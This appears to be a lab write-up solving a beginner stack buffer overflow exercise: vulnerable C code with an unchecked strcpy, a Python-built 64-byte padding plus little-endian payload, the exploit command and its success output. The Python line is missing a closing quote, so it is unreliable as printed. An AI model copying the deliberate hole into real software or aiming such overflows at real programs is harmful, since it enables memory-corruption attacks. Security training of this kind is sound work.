int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
This program does not take stdin, so cannot be piped to. Requires commandline argument instead.

Instead of manually crafting an input argument, I created one using python.
```python
print("A"*64 + "\x64\x63\x62\x61)
```
Output
```shell
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
```

Shell command
```shell
./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
```

Output
```shell
you have correctly got the variable to the right value
```

This was another simple buffer overflow, but this time the value to write must be crafted carefully. Order of byte writing is emphasized, teaching the concept of little endian representation.
